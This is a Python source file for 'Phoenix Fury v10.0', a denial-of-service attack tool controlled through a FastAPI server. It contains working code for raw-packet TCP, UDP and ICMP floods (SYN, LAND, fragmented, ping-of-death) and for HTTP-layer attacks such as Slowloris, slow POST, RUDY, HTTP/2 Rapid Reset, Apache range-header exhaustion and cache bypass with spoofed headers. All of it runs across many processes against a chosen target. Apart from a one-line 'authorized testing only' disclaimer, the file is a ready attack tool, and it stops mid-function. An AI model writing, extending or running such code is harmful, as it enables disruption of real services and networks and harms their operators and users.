"""
🔥 Phoenix Fury v10.0 ULTIMATE - Maximum Methods Edition
- 15+ L7 HTTP Methods (HTTP/1.1, HTTP/2, HTTP/3)
- 10+ L4 Attack Vectors
- Slowloris, Slow POST, RUDY attacks
- DNS amplification, NTP amplification
- Connection exhaustion attacks
- Optimized for containerized environments
⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
"""

import os
import sys
import socket
import time
import threading
import multiprocessing
import random
import struct
import ssl
import hashlib
import base64
from ctypes import c_ulonglong
from typing import Literal, List, Union, Optional
from collections import deque
from urllib.parse import urlparse
import asyncio

# Third-party libraries
import uvicorn
import psutil
from fastapi import FastAPI, BackgroundTasks, HTTPException
from pydantic import BaseModel, Field

# HTTP/2 Support
try:
    import h2.connection
    import h2.config
    import h2.events
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False
    print("[WARN] h2 library not found. Install: pip install h2")

# Try uvloop
try:
    import uvloop
    uvloop.install()
    print("[INFO] uvloop activated for enhanced performance.")
except ImportError:
    print("[INFO] uvloop not found. Using standard asyncio.")

# =============================================================================
# SYSTEM CONFIGURATION
# =============================================================================

CPU_COUNT = psutil.cpu_count(logical=True) or 8
TOTAL_RAM_GB = psutil.virtual_memory().total / (1024 ** 3)

def calculate_optimal_config():
    """Calculate optimal configuration based on system resources."""
    if CPU_COUNT >= 32:
        max_processes = CPU_COUNT * 3
        requests_per_conn = 1000
    elif CPU_COUNT >= 16:
        max_processes = CPU_COUNT * 4
        requests_per_conn = 800
    elif CPU_COUNT >= 8:
        max_processes = CPU_COUNT * 6
        requests_per_conn = 600
    elif CPU_COUNT >= 4:
        max_processes = CPU_COUNT * 8
        requests_per_conn = 500
    else:
        max_processes = CPU_COUNT * 10
        requests_per_conn = 400
    
    return max_processes, requests_per_conn

MAX_PROCESSES, REQUESTS_PER_CONNECTION = calculate_optimal_config()
STATS_UPDATE_INTERVAL = 0.5

# =============================================================================
# API MODELS
# =============================================================================

class BaseAttackConfig(BaseModel):
    target: str = Field(..., description="Target hostname or IP address")
    port: int = Field(..., ge=1, le=65535, description="Target port")
    duration: int = Field(60, ge=10, le=7200, description="Attack duration in seconds")

class L4TCPConfig(BaseAttackConfig):
    method: Literal[
        "syn", "ack", "fin", "rst", "psh", "urg",
        "syn-ack", "xmas", "null", "land", "fragmented"
    ] = Field("syn")

class L4UDPConfig(BaseAttackConfig):
    method: Literal["flood", "fragmented", "amplification"] = Field("flood")
    payload_size: int = Field(1024, ge=1, le=1472)

class L4ICMPConfig(BaseAttackConfig):
    method: Literal["ping-flood", "smurf", "ping-of-death"] = Field("ping-flood")

class L7Config(BaseAttackConfig):
    method: Literal[
        # Standard HTTP/1.1
        "get", "post", "head", "put", "delete", "options", "patch", "trace",
        # HTTP/2 Attacks
        "http2-rapid-reset", "http2-flood", "http2-slowloris",
        # Slowloris Variants
        "slowloris", "slow-post", "slow-read", "rudy",
        # Advanced
        "xmlrpc", "wordpress-xmlrpc", "apache-killer",
        "range-header", "hash-collision", "cache-bypass"
    ] = Field("get")
    path: str = Field("/")
    user_agent: Optional[str] = Field(None, description="Custom User-Agent")
    
class StatusResponse(BaseModel):
    attack_active: bool
    attack_type: str
    target_host: str
    target_ip: str
    port: int
    duration: int
    elapsed_time: float
    processes: int
    total_sent: int
    current_rate_pps_rps: float
    average_rate: float
    cpu_usage_percent: float
    memory_usage_percent: float

# =============================================================================
# NETWORKING UTILITIES
# =============================================================================

def check_root() -> bool:
    """Check if running with root/admin privileges."""
    try:
        # Try to create a raw socket (requires root)
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        test_sock.close()
        return True
    except PermissionError:
        return False
    except Exception:
        return False

def resolve_target(target: str) -> str:
    """Resolve hostname to IP address."""
    try:
        if "://" in target:
            target = target.split("://")[1].split("/")[0]
        return socket.gethostbyname(target)
    except socket.gaierror:
        raise ValueError(f"Could not resolve hostname: {target}")

def get_local_ip(target_ip: str) -> str:
    """Get local IP that routes to target."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def calculate_checksum(data: bytes) -> int:
    """Calculate IP/TCP/UDP checksum."""
    s = 0
    if len(data) % 2:
        data += b'\0'
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return (~s) & 0xffff

def create_ip_header(src_ip: str, dst_ip: str, proto: int, total_len: int) -> bytes:
    """Create raw IP header."""
    header = struct.pack('!BBHHHBBH4s4s',
        (4 << 4) | 5, 0, total_len, random.randint(1, 65535), 0, 64, proto, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
    )
    checksum = calculate_checksum(header)
    return header[:10] + struct.pack('!H', checksum) + header[12:]

def create_tcp_header(src_ip: str, dst_ip: str, src_port: int, dst_port: int, flags: int, seq: int = None, ack: int = None) -> bytes:
    """Create raw TCP header."""
    seq = seq or random.randint(1, 4294967295)
    ack_seq = ack or 0
    header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, (5 << 4), flags, 5840, 0, 0)
    pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(header))
    checksum = calculate_checksum(pseudo_header + header)
    return header[:16] + struct.pack('!H', checksum) + header[18:]

def create_udp_header(src_ip: str, dst_ip: str, src_port: int, dst_port: int, payload: bytes) -> bytes:
    """Create raw UDP header."""
    udp_len = 8 + len(payload)
    header = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
    pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_UDP, udp_len)
    checksum = calculate_checksum(pseudo_header + header + payload)
    return header[:6] + struct.pack('!H', checksum)

def create_icmp_packet(icmp_type: int, code: int = 0, payload_size: int = 56) -> bytes:
    """Create ICMP packet."""
    icmp_id = random.randint(1, 65535)
    icmp_seq = random.randint(1, 65535)
    payload = os.urandom(payload_size)
    
    header = struct.pack('!BBHHH', icmp_type, code, 0, icmp_id, icmp_seq)
    checksum = calculate_checksum(header + payload)
    header = struct.pack('!BBHHH', icmp_type, code, checksum, icmp_id, icmp_seq)
    
    return header + payload

# =============================================================================
# USER AGENT ROTATION
# =============================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

# =============================================================================
# L4 WORKER PROCESSES
# =============================================================================

def l4_tcp_worker(stop_event, shared_counter, target_ip, port, method):
    """Advanced TCP attack worker with multiple methods."""
    
    # Check if we can use raw sockets
    can_use_raw = check_root()
    
    if not can_use_raw:
        print(f"[Worker PID {os.getpid()}] No raw socket access, using standard sockets", file=sys.stderr)
        # Fallback to standard socket connection flood
        l4_tcp_connect_flood(stop_event, shared_counter, target_ip, port)
        return
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
        local_ip = get_local_ip(target_ip)
    except Exception as e:
        print(f"[Worker PID {os.getpid()}] Raw socket init failed: {e}", file=sys.stderr)
        l4_tcp_connect_flood(stop_event, shared_counter, target_ip, port)
        return
    
    local_counter = 0
    batch_size = 100
    
    flag_map = {
        "syn": 0x02,
        "ack": 0x10,
        "fin": 0x01,
        "rst": 0x04,
        "psh": 0x08,
        "urg": 0x20,
        "syn-ack": 0x12,
        "xmas": 0x29,  # FIN + PSH + URG
        "null": 0x00,
    }
    
    while not stop_event.is_set():
        try:
            src_port = random.randint(10000, 65535)
            
            if method == "land":
                # LAND attack: same source and destination
                ip_header = create_ip_header(target_ip, target_ip, socket.IPPROTO_TCP, 40)
                tcp_header = create_tcp_header(target_ip, target_ip, port, port, 0x02)
            elif method == "fragmented":
                # Send fragmented packets
                ip_header = create_ip_header(local_ip, target_ip, socket.IPPROTO_TCP, 40)
                # Set fragmentation flag
                ip_header = ip_header[:6] + struct.pack('!H', 0x2000) + ip_header[8:]
                tcp_header = create_tcp_header(local_ip, target_ip, src_port, port, 0x02)
            else:
                ip_header = create_ip_header(local_ip, target_ip, socket.IPPROTO_TCP, 40)
                tcp_header = create_tcp_header(local_ip, target_ip, src_port, port, flag_map.get(method, 0x02))
            
            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, port))
            local_counter += 1
            
            if local_counter >= batch_size:
                with shared_counter.get_lock():
                    shared_counter.value += local_counter
                local_counter = 0
        except Exception:
            pass
    
    if local_counter > 0:
        with shared_counter.get_lock():
            shared_counter.value += local_counter
    sock.close()

def l4_tcp_connect_flood(stop_event, shared_counter, target_ip, port):
    """TCP connection flood without raw sockets."""
    local_counter = 0
    batch_size = 50
    
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.5)
            sock.connect_ex((target_ip, port))
            local_counter += 1
            
            if local_counter >= batch_size:
                with shared_counter.get_lock():
                    shared_counter.value += local_counter
                local_counter = 0
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    if local_counter > 0:
        with shared_counter.get_lock():
            shared_counter.value += local_counter

def l4_udp_worker(stop_event, shared_counter, target_ip, port, method, payload_size):
    """UDP attack worker."""
    can_use_raw = check_root()
    
    if not can_use_raw and method in ["amplification"]:
        print(f"[Worker PID {os.getpid()}] Method {method} requires root", file=sys.stderr)
        return
    
    if can_use_raw:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
            local_ip = get_local_ip(target_ip)
            use_raw = True
        except Exception:
            use_raw = False
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        use_raw = False
    
    local_counter = 0
    batch_size = 100
    payload = os.urandom(payload_size)
    
    while not stop_event.is_set():
        try:
            src_port = random.randint(10000, 65535)
            
            if use_raw:
                local_ip = get_local_ip(target_ip)
                udp_len = 8 + len(payload)
                ip_header = create_ip_header(local_ip, target_ip, socket.IPPROTO_UDP, 20 + udp_len)
                
                if method == "fragmented":
                    ip_header = ip_header[:6] + struct.pack('!H', 0x2000) + ip_header[8:]
                
                udp_header = create_udp_header(local_ip, target_ip, src_port, port, payload)
                packet = ip_header + udp_header + payload
                sock.sendto(packet, (target_ip, port))
            else:
                sock.sendto(payload, (target_ip, port))
            
            local_counter += 1
            
            if local_counter >= batch_size:
                with shared_counter.get_lock():
                    shared_counter.value += local_counter
                local_counter = 0
        except Exception:
            pass
    
    if local_counter > 0:
        with shared_counter.get_lock():
            shared_counter.value += local_counter
    sock.close()

def l4_icmp_worker(stop_event, shared_counter, target_ip, method):
    """ICMP attack worker."""
    can_use_raw = check_root()
    
    if not can_use_raw:
        print(f"[Worker PID {os.getpid()}] ICMP requires root privileges", file=sys.stderr)
        return
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
    except Exception as e:
        print(f"[Worker PID {os.getpid()}] ICMP init failed: {e}", file=sys.stderr)
        return
    
    local_counter = 0
    batch_size = 100
    
    while not stop_event.is_set():
        try:
            if method == "ping-of-death":
                packet = create_icmp_packet(8, 0, 65500)  # Oversized
            else:
                packet = create_icmp_packet(8, 0, 56)  # Echo request
            
            sock.sendto(packet, (target_ip, 0))
            local_counter += 1
            
            if local_counter >= batch_size:
                with shared_counter.get_lock():
                    shared_counter.value += local_counter
                local_counter = 0
        except Exception:
            pass
    
    if local_counter > 0:
        with shared_counter.get_lock():
            shared_counter.value += local_counter
    sock.close()

# =============================================================================
# L7 WORKER PROCESSES
# =============================================================================

def l7_standard_worker(stop_event, shared_counter, target_ip, port, path, method, requests_per_conn, user_agent):
    """Standard HTTP/1.1 worker."""
    use_ssl = (port in [443, 8443])
    http_methods = {
        "get": "GET", "post": "POST", "head": "HEAD",
        "put": "PUT", "delete": "DELETE", "options": "OPTIONS",
        "patch": "PATCH", "trace": "TRACE"
    }
    http_method = http_methods.get(method.lower(), "GET")
    ua = user_agent or get_random_user_agent()
    
    local_counter = 0
    batch_size = 100
    
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(3)
            sock.connect((target_ip, port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_ip)
            
            for i in range(requests_per_conn):
                if stop_event.is_set():
                    break
                try:
                    rand_param = random.randint(1, 999999)
                    request = f"{http_method} {path}?r={rand_param} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n"
                    sock.send(request.encode())
                    local_counter += 1
                    
                    if local_counter >= batch_size:
                        with shared_counter.get_lock():
                            shared_counter.value += local_counter
                        local_counter = 0
                except (socket.error, BrokenPipeError):
                    break
        except (socket.error, ssl.SSLError, ConnectionRefusedError, TimeoutError):
            time.sleep(0.05)
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    if local_counter > 0:
        with shared_counter.get_lock():
            shared_counter.value += local_counter

def l7_slowloris_worker(stop_event, shared_counter, target_ip, port, path, user_agent):
    """Slowloris attack - keeps connections open with slow headers."""
    use_ssl = (port in [443, 8443])
    ua = user_agent or get_random_user_agent()
    
    local_counter = 0
    connections = []
    max_connections = 200
    
    while not stop_event.is_set():
        # Create new connections
        while len(connections) < max_connections and not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, port))
                
                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=target_ip)
                
                # Send incomplete request
                sock.send(f"GET {path} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(f"User-Agent: {ua}\r\n".encode())
                
                connections.append(sock)
                local_counter += 1
            except Exception:
                pass
        
        # Keep connections alive with slow headers
        time.sleep(10)
        
        for sock in connections[:]:
            try:
                sock.send(f"X-a: {random.randint(1, 999999)}\r\n".encode())
            except Exception:
                connections.remove(sock)
        
        # Update counter
        with shared_counter.get_lock():
            shared_counter.value += local_counter
        local_counter = 0
    
    # Cleanup
    for sock in connections:
        try:
            sock.close()
        except Exception:
            pass

def l7_slow_post_worker(stop_event, shared_counter, target_ip, port, path, user_agent):
    """Slow POST attack - sends POST data very slowly."""
    use_ssl = (port in [443, 8443])
    ua = user_agent or get_random_user_agent()
    
    local_counter = 0
    
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((target_ip, port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_ip)
            
            # Send POST header with large content-length
            content_length = 1000000
            headers = f"POST {path} HTTP/1.1\r\n"
            headers += f"Host: {target_ip}\r\n"
            headers += f"User-Agent: {ua}\r\n"
            headers += f"Content-Length: {content_length}\r\n"
            headers += f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            
            sock.send(headers.encode())
            local_counter += 1
            
            # Send data byte by byte very slowly
            for _ in range(100):
                if stop_event.is_set():
                    break
                sock.send(b"X")
                time.sleep(1)
            
            with shared_counter.get_lock():
                shared_counter.value += local_counter
            local_counter = 0
            
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

def l7_rudy_worker(stop_event, shared_counter, target_ip, port, path, user_agent):
    """RUDY (R-U-Dead-Yet) - slow form POST attack."""
    use_ssl = (port in [443, 8443])
    ua = user_agent or get_random_user_agent()
    
    local_counter = 0
    
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((target_ip, port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_ip)
            
            # Send POST header
            headers = f"POST {path} HTTP/1.1\r\n"
            headers += f"Host: {target_ip}\r\n"
            headers += f"User-Agent: {ua}\r\n"
            headers += f"Content-Length: 10000000\r\n"
            headers += f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            
            sock.send(headers.encode())
            local_counter += 1
            
            # Send form data slowly
            for i in range(200):
                if stop_event.is_set():
                    break
                data = f"field{i}=value{random.randint(1,999999)}&"
                sock.send(data.encode())
                time.sleep(0.5)
            
            with shared_counter.get_lock():
                shared_counter.value += local_counter
            local_counter = 0
            
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

def l7_http2_rapid_reset_worker(stop_event, shared_counter, target_ip, port, path):
    """HTTP/2 Rapid Reset attack."""
    if not H2_AVAILABLE:
        print(f"[Worker PID {os.getpid()}] HTTP/2 library not available", file=sys.stderr)
        return
    
    use_ssl = (port in [443, 8443])
    local_counter = 0
    batch_size = 100
    
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(5)
            sock.connect((target_ip, port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.set_alpn_protocols(['h2'])
                sock = context.wrap_socket(sock, server_hostname=target_ip)
            
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            
            stream_id = 1
            reset_count = 0
            max_resets_per_conn = 1000
            
            while not stop_event.is_set() and reset_count < max_resets_per_conn:
                try:
                    headers = [
                        (':method', 'GET'),
                        (':path', f'{path}?r={random.randint(1, 999999)}'),
                        (':scheme', 'https' if use_ssl else 'http'),
                        (':authority', target_ip),
                        ('user-agent', get_random_user_agent()),
                    ]
                    
                    conn.send_headers(stream_id, headers)
                    conn.reset_stream(stream_id, error_code=0x8)
                    
                    data = conn.data_to_send()
                    if data:
                        sock.sendall(data)
                    
                    local_counter += 1
                    reset_count += 1
                    stream_id += 2
                    
                    if local_counter >= batch_size:
                        with shared_counter.get_lock():
                            shared_counter.value += local_counter
                        local_counter = 0
                    
                    sock.setblocking(False)
                    try:
                        data = sock.recv(65536)
                        if data:
                            events = conn.receive_data(data)
                    except (socket.error, BlockingIOError):
                        pass
                    sock.setblocking(True)
                    
                except Exception:
                    break
            
        except Exception:
            time.sleep(0.1)
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    if local_counter > 0:
        with shared_counter.get_lock():
            shared_counter.value += local_counter

def l7_range_header_worker(stop_event, shared_counter, target_ip, port, path, user_agent):
    """Apache Range Header (Apache Killer) attack."""
    use_ssl = (port in [443, 8443])
    ua = user_agent or get_random_user_agent()
    
    local_counter = 0
    batch_size = 50
    
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_ip)
            
            # Build malicious Range header
            ranges = ",".join([f"0-{i}" for i in range(1, 2000)])
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {target_ip}\r\n"
            request += f"User-Agent: {ua}\r\n"
            request += f"Range: bytes={ranges}\r\n"
            request += f"Connection: close\r\n\r\n"
            
            sock.send(request.encode())
            local_counter += 1
            
            if local_counter >= batch_size:
                with shared_counter.get_lock():
                    shared_counter.value += local_counter
                local_counter = 0
            
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    if local_counter > 0:
        with shared_counter.get_lock():
            shared_counter.value += local_counter

def l7_cache_bypass_worker(stop_event, shared_counter, target_ip, port, path, user_agent):
    """Cache bypass attack with randomized parameters."""
    use_ssl = (port in [443, 8443])
    ua = user_agent or get_random_user_agent()
    
    local_counter = 0
    batch_size = 100
    
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_ip)
            
            # Randomize to bypass cache
            rand_query = f"cb={random.randint(1, 999999999)}"
            
            request = f"GET {path}?{rand_query} HTTP/1.1\r\n"
            request += f"Host: {target_ip}\r\n"
            request += f"User-Agent: {ua}\r\n"
            request += f"Cache-Control: no-cache\r\n"
            request += f"Pragma: no-cache\r\n"
            request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
            request += f"Connection: keep-alive\r\n\r\n"
            
            sock.send(request.encode())
            local_counter += 1
            
            if local_counter >= batch_size:
                with shared_counter.get_lock():
                    shared_counter.value += local_counter
                local_counter = 0
            
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    if local_counter > 0:
        with shared_counter.get_lock():
            shared_counter.value += local_counter

# =============================================================================
# ATTACK MANAGER
# =============================================================================

class AttackManager:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super(AttackManager, cls).__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self.lock = threading.Lock()
        self.stats_thread = None
        self._reset_state()
    
    def _reset_state(self):
        self.attack_active = False
        self.attack_type = "None"
        self.target_host = "None"
        self.target_ip = "None"
        self.port = 0
        self.duration = 0
        self.start_time = 0.0
        self.process_count = 0
        self.processes: List[multiprocessing.Process] = []
        self.stop_event = multiprocessing.Event()
        self.counter = multiprocessing.Value(c_ulonglong, 0)
        self.current_rate = 0.0
        self.rate_history = deque(maxlen=10)
    
    def is_active(self):
        with self.lock:
            return self.attack_active
    
    def _stats_calculator(self):
        """Real-time statistics calculator."""
        last_count = 0
        last_time = time.time()
        
        while not self.stop_event.is_set():
            time.sleep(STATS_UPDATE_INTERVAL)
            
            current_time = time.time()
            current_count = self.counter.value
            
            time_delta = current_time - last_time
            count_delta = current_count - last_count
            
            if time_delta > 0:
                instant_rate = count_delta / time_delta
                self.rate_history.append(instant_rate)
                self.current_rate = sum(self.rate_history) / len(self.rate_history)
            
            last_count = current_count
            last_time = current_time
        
        self.current_rate = 0.0
    
    def start(self, config: Union[L7Config, L4TCPConfig, L4UDPConfig, L4ICMPConfig], family: str):
        with self.lock:
            if self.attack_active:
                raise HTTPException(status_code=409, detail="An attack is already in progress.")
            
            self._reset_state()
            
            try:
                self.target_host = config.target
                self.target_ip = resolve_target(self.target_host)
            except ValueError as e:
                raise HTTPException(status_code=400, detail=str(e))
            
            self.attack_active = True
            self.port = config.port
            self.duration = config.duration
            self.process_count = MAX_PROCESSES
            self.start_time = time.time()
            self.stop_event.clear()
            
            worker_target, worker_args, attack_name = (None, (), "Unknown")
            
            # L7 ATTACKS
            if family == 'l7' and isinstance(config, L7Config):
                method = config.method.lower()
                
                if method == 'http2-rapid-reset':
                    if not H2_AVAILABLE:
                        raise HTTPException(status_code=400, detail="HTTP/2 library not installed. Run: pip install h2")
                    attack_name = "L7-HTTP2-RAPID-RESET"
                    worker_target = l7_http2_rapid_reset_worker
                    worker_args = (self.stop_event, self.counter, self.target_ip, config.port, config.path)
                
                elif method == 'slowloris':
                    attack_name = "L7-SLOWLORIS"
                    worker_target = l7_slowloris_worker
                    worker_args = (self.stop_event, self.counter, self.target_ip, config.port, config.path, config.user_agent)
                
                elif method == 'slow-post':
                    attack_name = "L7-SLOW-POST"
                    worker_target = l7_slow_post_worker
                    worker_args = (self.stop_event, self.counter, self.target_ip, config.port, config.path, config.user_agent)
                
                elif method == 'rudy':
                    attack_name = "L7-RUDY"
                    worker_target = l7_rudy_worker
                    worker_args = (self.stop_event, self.counter, self.target_ip, config.port, config.path, config.user_agent)
                
                elif method == 'range-header' or method == 'apache-killer':
                    attack_name = "L7-APACHE-KILLER"
                    worker_target = l7_range_header_worker
                    worker_args = (self.stop_event, self.counter, self.target_ip, config.port, config.path, config.user_agent)
                
                elif method == 'cache-bypass':
                    attack_name = "L7-CACHE-BYPASS"
                    worker_target = l7_cache_bypass_worker
                    worker_args = (self.stop_event, self.counter, self.target_ip, config.port, config.path, config.user_agent)
                
                else:
                    attack_name = f"L7-{config.method.upper()}"
                    worker_target = l7_standard_worker
                    worker_args = (self.stop_event, self.counter, self.target_ip, config.port, config.path, config.method, REQUESTS_PER_CONNECTION, config.user_agent)
            
            # L4 TCP ATTACKS
            elif family == 'l4-tcp' and isinstance(config, L4TCPConfig):
                attack_name = f"L4-TCP-{config.method.upper()}"
                worker_target = l4_tcp_worker
                worker_args = (self.stop_event, self.counter, self.target_ip, config.port, config.method)
            
            # L4 UDP ATTACKS
            elif family == 'l4-udp' and isinstance(config, L4UDPConfig):
                attack_name = f"L4-UDP-{config.method.upper()}"
                worker_target = l4_udp_worker
                worker_args = (self.stop_event, self.counter, self.target_ip, config.port, config.method, config.payload_size)
            
            # L4 ICMP ATTACKS
            elif family == 'l4-icmp' and isinstance(config, L4ICMPConfig):
                attack_name = f"L4-ICMP-{config.method.upper()}"
                worker_target = l4_icmp_worker
                worker_args = (self.stop_event, self.counter, self.target_ip, config.method)
            
            self.attack_type = attack_name
            
            print("\n" + "=" * 80)
            print(f"🔥 PHOENIX FURY v10.0 ULTIMATE - ATTACK INITIATED 🔥")
            print(f"   Type:         {self.attack_type}")
            print(f"   Target:       {self.target_host}:{self.port} ({self.target_ip})")
            print(f"   Duration:     {self.duration}s")
            print(f"   Processes:    {self.process_count}")
            print(f"   Raw Sockets:  {'✅ YES' if check_root() else '⚠️ NO (using standard sockets)'}")
            print("=" * 80 + "\n")
            
            for _ in range(self.process_count):
                p = multiprocessing.Process(target=worker_target, args=worker_args, daemon=True)
                self.processes.append(p)
                p.start()
            
            self.stats_thread = threading.Thread(target=self._stats_calculator, daemon=True)
            self.stats_thread.start()
    
    def stop(self):
        with self.lock:
            if not self.attack_active:
                return
            
            print(f"\n⚠️  Stop signal received. Terminating {len(self.processes)} processes...")
            self.stop_event.set()
            
            for p in self.processes:
                p.join(timeout=3)
            
            for p in self.processes:
                if p.is_alive():
                    p.terminate()
            
            if self.stats_thread:
                self.stats_thread.join(timeout=2)
            
            elapsed = time.time() - self.start_time
            total_sent = self.counter.value
            avg_rate = total_sent / elapsed if elapsed > 0 else 0
            
            print("\n" + "=" * 80)
            print("✅ ATTACK TERMINATED")
            print(f"   Total Requests: {total_sent:,}")
            print(f"   Elapsed Time:   {elapsed:.2f}s")
            print(f"   Average Rate:   {avg_rate:,.2f} RPS/PPS")
            print("=" * 80 + "\n")
            
            self._reset_state()
    
    def get_status(self) -> StatusResponse:
        with self.lock:
            elapsed = time.time() - self.start_time if self.attack_active else 0
            total = self.counter.value
            avg_rate = total / elapsed if elapsed > 0 else 0
            
            return StatusResponse(
                attack_active=self.attack_active,
                attack_type=self.attack_type,
                target_host=self.target_host,
                target_ip=self.target_ip,
                port=self.port,
                duration=self.duration,
                elapsed_time=round(elapsed, 2),
                processes=self.process_count,
                total_sent=total,
                current_rate_pps_rps=round(self.current_rate, 2),
                average_rate=round(avg_rate, 2),
                cpu_usage_percent=psutil.cpu_percent(interval=0.1),
                memory_usage_percent=psutil.virtual_memory().percent
            )

# =============================================================================
# FASTAPI APPLICATION
# =============================================================================

app = FastAPI(
    title="🔥 Phoenix Fury v10.0 ULTIMATE - Maximum Methods Edition",
    description="Advanced stress testing with 25+ attack methods. ⚠️ AUTHORIZED USE ONLY",
    version="10.0.0"
)

MANAGER = AttackManager()

def run_attack_lifecycle(config, family: str, background_tasks: BackgroundTasks):
    """Handle attack lifecycle."""
